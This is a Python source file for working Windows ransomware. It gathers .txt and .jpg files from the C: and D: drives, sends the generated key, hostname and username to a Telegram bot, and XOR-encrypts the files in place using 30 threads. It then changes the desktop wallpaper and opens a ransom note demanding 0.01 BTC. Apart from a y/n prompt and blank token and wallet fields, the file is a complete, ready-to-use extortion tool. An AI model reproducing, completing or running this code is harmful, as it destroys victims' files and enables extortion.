########### steps ###########
# 1 make a safe mode
# 2 file extensions and grabbing files
# 3 generate key
# 4 connect to the server
# 4' In my case I use telegram servers for communication and use Discord when exception to occur
# 5 main function for encryption
# 6 make a queue and multi threading
# 7 change backGround
# 8 open notepad that Pop up our notice
# 9 the website that we interested to open it and show to user of system
###########################################
import os
import random
import socket
from datetime import datetime
from threading import Thread
from queue import Queue
import webbrowser
import time
import requests
import ctypes
import getpass

######### Variables #########
hostName = os.getenv('COMPUTERNAME')
currentUserOfWindows = getpass.getuser()
extensions = ('.txt', '.jpg',)
Drives = ('C:\\', 'D:\\')
encrypt_files = []
key = ''
encryption_level = 128 // 8
entireOfAscii = ''
serverIp = ''
talkingPort = 5678
currentTime = datetime.now()
sleepTimeForPopUpWebSite = 60  # in second
PopUpWebSite = 'https://bitcoin.org/en/'
BackGroundUrl = 'https://cdn.vox-cdn.com/thumbor/r0Cax1alqND1h-nVEHSlhaza-i0=/0x0:2040x1360/1200x800/filters:focal(857x517:1183x843)/cdn.vox-cdn.com/uploads/chorus_image/image/68920935/acastro_170629_1777_0008_v2.0.jpg'
CurrenPath = os.getcwd()
TelegramID = ''
BTCWalletAddress = ''
telegramChatID = ''
BotToken = ''
#MassageForCallbackServer DECLARE IN NEXT LINE
#telegramMassageURL DECLARE IN NEXT LINE
transferKey = '' #key that upload send to server or sent to telegram
###########################################
# 1 make a safe mode
startOpration = input(f'run ransomware on {hostName} system? (y/n)')
if startOpration != 'y':
    exit()
###########################################
# 2 file extensions and grabbing files
for d in Drives:
    for root, directory, files in os.walk(d):
        for file in files:
            file_path, file_extension = os.path.splitext(root + '\\' + file)
            if file_extension in extensions:
                encrypt_files.append(root + '\\' + file)
###########################################
# 3 generate key
for i in range(0x00, 0xFF):
    entireOfAscii += chr(i)

for i in range(encryption_level):
    key += random.choice(entireOfAscii)
###########################################
# 4 connect to the server
# with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
#    s.connect((serverIp, talkingPort))
#    s.send(f'[{currentTime}] - {hostName}:{key}'.encode('utf-8'))
###########################################
# 4' In my case I use telegram servers for communication and use Discord when exception to occur

transferKey = key.encode('utf-8')
MassageForCallbackServer = f'''[Time] : [{currentTime}] \n
[hostName] : [{hostName}] \n
[CurrentUserName] : [{currentUserOfWindows}] \n 
[key] : [{transferKey}] '''

telegramMassageURL = f'https://api.telegram.org/bot{BotToken}/sendMessage?chat_id={telegramChatID}&text="{MassageForCallbackServer}"'
try:
    requests.get(telegramMassageURL)
except:
    pass


###########################################
# 5 main function for encryption
def encryption(key):
    index = 0
    max_index = encryption_level - 1
    while q.not_empty:
        targetFile = q.get()
        #
        if os.path.getsize(targetFile) == 0:
            pass
        #
        else:
            try:
                with open(targetFile, 'rb') as f1:
                    targetFileBinary = f1.read()
                    with open(targetFile, 'wb') as f2:
                        for byte in targetFileBinary:
                            if index >= max_index:
                                index = 0
                            byte_XOR_key = byte ^ ord(key[index])
                            f2.write(byte_XOR_key.to_bytes(1, 'little'))
                            index += 1

                        f1.close()
                        f2.close()
            except:  # file require admin privilege
                print(f'fail to encrypt {targetFile}\n')
        #
        q.task_done()


###########################################
# 6 make a queue and multi threading
q = Queue()
for file in encrypt_files:
    q.put(file)
for i in range(30):  # 30 is my choice for multi threading
    thread = Thread(target=encryption, args=(key,), daemon=True)
    thread.start()

q.join()
print("encryption was successful")
###########################################
# 7 change backGround
f = open('BackGround.jpg', 'wb')
try:
    f.write(requests.get(BackGroundUrl).content)
    f.close()
except:
    pass
ctypes.windll.user32.SystemParametersInfoW(20, 0, CurrenPath + '\\' + 'BackGround.jpg', 0)
###########################################
# 8 open notpad that Pop up our notice
for i in range(1):
    file = 'Notice' + str(i) + '.txt'
    with open(file, 'w') as note:
        note.write(f'''SORRY! YOUR SYSTEM IS ENCRYPTED WITH SUPER-SECURITY ALGORITHM,
JUST I CAN DECRYPT YOUR FILE AND SAVE YOUR SYSTEM.
FOR GOOD WILL, YOU CAN SEND ONE OF ENCRYPTED FILE TO
{TelegramID} TELEGRAM-ID AND RECEIVE DECRYPTED FILE.
FOR SAVE ALL OF YOUR FILE YOU MUST PAY 0.01 BTC TO TIHS WALET ADDRESS
{BTCWalletAddress} AND I WILL SEND YOU KEY.
NOTE:ANY OTHER ATTEMPT WILL CAUSE YOUR SYSTEM TO BE LOCKED FOREVER.
TAKE CARE...
''')
    webbrowser.open(file)
###########################################
# 9 the website that we interested to open it and show to user of system
time.sleep(sleepTimeForPopUpWebSite)
webbrowser.open(PopUpWebSite)
###########################################
